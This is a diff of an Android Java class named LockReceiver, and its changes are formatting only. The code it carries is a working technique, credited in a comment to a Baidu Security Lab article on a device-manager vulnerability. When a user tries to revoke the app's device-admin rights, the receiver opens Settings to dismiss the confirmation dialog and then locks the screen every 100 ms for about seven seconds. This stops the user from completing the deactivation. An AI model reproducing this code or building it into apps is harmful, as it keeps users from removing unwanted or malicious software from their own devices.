@@ -24,8 +24,7 @@ import com.yline.log.LogFileUtil;
  * <以上两点来自于  百度安全实验室一篇文章《Android设备管理器漏洞2》>
  * 该方式,实现成功
  */
-public class LockReceiver extends DeviceAdminReceiver
-{
+public class LockReceiver extends DeviceAdminReceiver {
     /*
     //    方式1,方式2
     @Override
@@ -43,36 +42,29 @@ public class LockReceiver extends DeviceAdminReceiver
         return ""; // 这是一个可选的消息,警告有关禁止用户的请求
     }
     */
-
+	
 	@Override
-	public CharSequence onDisableRequested(Context context, Intent intent)
-	{
+	public CharSequence onDisableRequested(Context context, Intent intent) {
 		LogFileUtil.v(MainApplication.TAG, "onDisableRequested is runned");
 		// 跳离当前询问是否取消激活的 dialog
 		Intent outOfDailog = context.getPackageManager().getLaunchIntentForPackage("com.android.settings");
 		outOfDailog.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 		context.startActivity(outOfDailog);
-
+		
 		// 调用设备管理器本身的功能,每100ms锁屏一次,用户即使解锁,也会立即被锁,直至7s后
 		final DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
 		dpm.lockNow();
-		new Thread(new Runnable()
-		{
-
+		new Thread(new Runnable() {
+			
 			@Override
-			public void run()
-			{
+			public void run() {
 				int i = 0;
-				while (i < 70)
-				{
+				while (i < 70) {
 					dpm.lockNow();
-					try
-					{
+					try {
 						Thread.sleep(100);
 						i++;
-					}
-					catch (InterruptedException e)
-					{
+					} catch (InterruptedException e) {
 						e.printStackTrace();
 					}
 				}
@@ -80,10 +72,9 @@ public class LockReceiver extends DeviceAdminReceiver
 		}).start();
 		return "";
 	}
-
+	
 	@Override
-	public void onDisabled(Context context, Intent intent)
-	{
+	public void onDisabled(Context context, Intent intent) {
 		super.onDisabled(context, intent);
 		LogFileUtil.v(MainApplication.TAG, "onDisabled is runned");
 	}
